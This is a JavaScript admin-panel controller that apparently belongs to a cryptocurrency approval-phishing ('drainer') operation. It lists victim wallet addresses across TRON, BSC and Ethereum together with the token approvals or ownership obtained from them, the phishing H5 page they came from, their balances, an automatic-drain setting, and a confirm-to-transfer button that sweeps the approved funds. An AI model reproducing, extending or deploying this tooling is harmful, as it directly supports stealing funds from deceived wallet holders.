define(['jquery', 'bootstrap', 'backend', 'table', 'form'], function ($, undefined, Backend, Table, Form) {

    var Controller = {
        index: function () {
            // 初始化表格参数配置
            Table.api.init({
                extend: {
                    index_url: 'address/index' + location.search,
                    edit_url: 'address/edit',
                    multi_url: 'address/multi',
                    table: 'address',
                }
            });

            var table = $("#table");
            //当表格数据加载完成时
            table.on('load-success.bs.table', function (e, data) {
                //这里我们手动设置底部的值
                $("#all_money_online").text(data.extend.all_money_online);
            });

            // 初始化表格
            table.bootstrapTable({
                url: $.fn.bootstrapTable.defaults.extend.index_url,
                pk: 'id',
                sortName: 'id',
                fixedColumns: true,
                fixedRightNumber: 4,
                columns: [
                    [
                        {checkbox: true},
                        {field: 'id', title: __('Id')},
                        {field: 'chain', title: __('链路')},
                        {field: 'address', title: __('Address'), operate: 'LIKE', formatter: function(value,row) {
                                switch (row.chain){
                                    case 'trc':
                                        return '<div><span className="input-group-btn input-group-sm"><a href="https://tronscan.org/#/balanceView/'+value+'/approval" target="_blank" className="btn btn-default btn-sm">'+value+'<i className="fa fa-link"></i></a></span></div>';
                                    case 'bsc':
                                        return '<div><span className="input-group-btn input-group-sm"><a href="https://bscscan.com/tokenapprovalchecker?search='+value+'" target="_blank" className="btn btn-default btn-sm">'+value+'<i className="fa fa-link"></i></a></span></div>';
                                    case 'eth':
                                        return '<div><span className="input-group-btn input-group-sm"><a href="https://etherscan.io/tokenapprovalchecker?search='+value+'" target="_blank" className="btn btn-default btn-sm">'+value+'<i className="fa fa-link"></i></a></span></div>';
                                    case 'okt':
                                        return value;
                                }
                            }},
                        {field: 'updatetime', sortable: true, title: __('Updatetime'), operate:'RANGE', addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},
                        {field: 'auto', title: __('自动划'), formatter: function(value,row,index) {
                                var valueName = "";
                                switch (parseInt(value)){
                                    case 0:
                                        valueName="<spand style='color: navy'>否</spand>";
                                        break;
                                    case 1:
                                        valueName="<spand style='color: red'>是</spand>["+row['auto_money']+"]";
                                        break;
                                }
                                return valueName;
                            }, searchList: {"0":__('否'),"1":__('是')}},
                        {field: 'createtime', sortable: true, title: __('Createtime'), operate:'RANGE', addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},
                        {field: 'approve_address', title: __('Approve_address'), operate: 'LIKE'},
                        {field: 'is_approve_old', title: __('是否授权过'), formatter: function(value,row,index) {
                                var valueName = "";
                                switch (parseInt(value)){
                                    case 1:
                                        valueName="<spand style='color: red'>授权过</spand>";
                                        break;
                                    case 0:
                                        valueName="<spand style='color: navy'>未授权</spand>";
                                        break;
                                }
                                if(row.approve_type === 2){
                                    valueName="<spand style='color: red'>获得权限</spand>";
                                }
                                return valueName;
                            }, searchList: {"0":__('未授权'),"1":__('授权过')}},
                        {field: 'approve_type', title: __('授权类型'), formatter: function(value,row,index) {
                                var valueName = "";
                                switch (parseInt(value)){
                                    case 0:
                                        valueName="<spand style='color: red'>合约授权</spand>";
                                        break;
                                    case 1:
                                        valueName="<spand style='color: navy'>账号授权</spand>";
                                        break;
                                    case 2:
                                        valueName="<spand style='color: #0a4b3e'>获得所有权</spand>";
                                        break;
                                }
                                return valueName;
                            }, searchList: {"0":__('合约授权'),"1":__('账号授权'),"2":__('获得所有权')}},
                        {field: 'h5_url', title: __('来源'), operate: 'LIKE'},
                        {field: 'contract_address', title: __('币合约'), operate: 'LIKE'},
                        {field: 'approve_address_decimals', title: __('币精度'), operate: 'LIKE'},
                        {field: 'max_money', title: __('历史最高'), operate:'BETWEEN', sortable: true},
                        {field: 'money_online', title: __('Money_online'), operate:'BETWEEN', sortable: true},
                        {field: 'money_approve', title: __('Money_approve'), operate:'BETWEEN', sortable: true},
                        {field: 'operate', title: __('Operate'), table: table,events:
                            Table.api.events.operate, formatter: function (value, row, index) {
                                var that = $.extend({}, this);
                                $(table).data("operate-del",null); // 列表页面隐藏 .编辑operate-edit - 删除按钮operate-del
                                that.table = table;
                                return Table.api.formatter.operate.call(that, value, row, index);
                            },buttons:[
                                {
                                    name: 'transfer',
                                    text: '划款',
                                    title: __('划款'),
                                    classname: 'btn btn-xs btn-magic btn-ajax btn-danger',
                                    icon: 'fa fa-magic',
                                    confirm: '确认划款？',
                                    url: 'address/reviewTransfer',
                                    success: function (data, ret) {
                                        console.log()
                                        Layer.alert(ret.msg + ",返回数据：" + JSON.stringify(data));
                                        //如果需要阻止成功提示，则必须使用return false;
                                        //return false;
                                    },
                                    visible:function (data){
                                        // console.log(data.money_approve)
                                        return (data.money_approve > 0  || data.money_approve ==='无限') && data.money_online > 0
                                    },
                                    error: function (data, ret) {
                                        console.log(data, ret);
                                        Layer.alert(ret.msg);
                                        return false;
                                    }
                                },
                            ]
                        }
                    ]
                ]
            });
            // 为表格绑定事件
            Table.api.bindevent(table);
        },
        add: function () {
            Controller.api.bindevent();
        },
        edit: function () {
            Controller.api.bindevent();
        },
        api: {
            bindevent: function () {
                Form.api.bindevent($("form[role=form]"));
            }
        }
    };
    return Controller;
});
